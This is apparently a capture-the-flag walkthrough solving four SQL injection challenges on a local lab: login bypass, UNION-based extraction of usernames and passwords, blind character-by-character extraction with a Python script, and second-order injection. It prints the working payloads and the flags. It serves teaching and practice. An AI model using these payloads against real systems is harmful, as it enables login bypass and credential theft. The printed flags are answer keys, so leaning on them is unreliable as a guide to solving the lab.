# SQL Injection Walkthroughs

## Challenge 1: Login Bypass (Easy — 100pts)

**Flag:** `FLAG{sql_injection_login_bypass_101}`

### Vulnerability
The login form builds the SQL query using string concatenation:
```sql
SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'
```

### Solution
Enter this in the **username** field:
```
' OR 1=1--
```
Leave the password field as anything (e.g., `x`).

### How it works
The query becomes:
```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='x'
```
- `' OR 1=1` makes the WHERE clause always true
- `--` comments out the rest of the query (the password check)
- The database returns the first user (admin)

### Tools
No tools needed — just the browser.

---

## Challenge 2: Data Exfiltration — UNION SELECT (Easy — 150pts)

**Flag:** `FLAG{union_select_data_exfil}`

### Vulnerability
The search query is vulnerable to UNION-based injection:
```sql
SELECT name, description, price FROM products WHERE name LIKE '%[INPUT]%'
```

### Solution
Enter this in the search field:
```
' UNION SELECT username, password, role FROM users--
```

### How it works
1. The original query selects 3 columns (name, description, price)
2. UNION SELECT must match the same number of columns
3. We select username, password, role from the users table
4. The results are displayed in the product table
5. The admin password `sup3rs3cur3p@ss` is revealed

### Finding the column count
If you don't know the column count, try:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    ← This one works (3 columns)
```

---

## Challenge 3: Blind SQL Injection (Medium — 250pts)

**Flag:** `FLAG{bl1nd_sqli_master}`

### Vulnerability
The user lookup doesn't show query results, but the page changes based on whether the query returns data:
- Returns data → "Welcome, [username]"
- No data → "User not found"

### Solution
Extract the flag character by character:

```
# Test if first character is 'F'
1 AND SUBSTRING((SELECT flag FROM secrets WHERE id=1),1,1)='F'
→ Shows "Welcome" = TRUE

# Test second character
1 AND SUBSTRING((SELECT flag FROM secrets WHERE id=1),2,1)='L'
→ Shows "Welcome" = TRUE

# Continue for each character...
```

### Automated with Python
```python
import requests

flag = ""
for pos in range(1, 30):
    for char in "FLAG{}_abcdefghijklmnopqrstuvwxyz0123456789":
        url = f"http://localhost:8080/challenges/sqli/blind?id=1 AND SUBSTRING((SELECT flag FROM secrets WHERE id=1),{pos},1)='{char}'"
        r = requests.get(url)
        if "Welcome" in r.text:
            flag += char
            print(f"[+] {flag}")
            break
    else:
        break

print(f"Flag: {flag}")
```

---

## Challenge 4: Second-Order SQL Injection (Hard — 350pts)

**Flag:** `FLAG{s3cond_0rder_injection}`

### Vulnerability
1. Registration uses **parameterized queries** (safe)
2. Profile page uses the **stored username** in a string-concatenated query (unsafe)

### Solution

**Step 1:** Register with a malicious username:
```
' UNION SELECT value FROM flags WHERE name='second_order'--
```

**Step 2:** View the profile for that username.

### How it works
1. Registration: `INSERT INTO profiles (username, bio) VALUES (?, ?)` — safe, stores the payload as-is
2. Profile lookup: `SELECT bio FROM profiles WHERE username='[stored_username]'` — unsafe!
3. When the stored malicious username is used in the second query, it triggers the UNION SELECT
4. The flag from the `flags` table is returned as a "bio"

### Why it's tricky
- The registration form is NOT vulnerable (parameterized)
- The vulnerability only triggers later when the stored data is used
- This mimics real-world second-order injection patterns
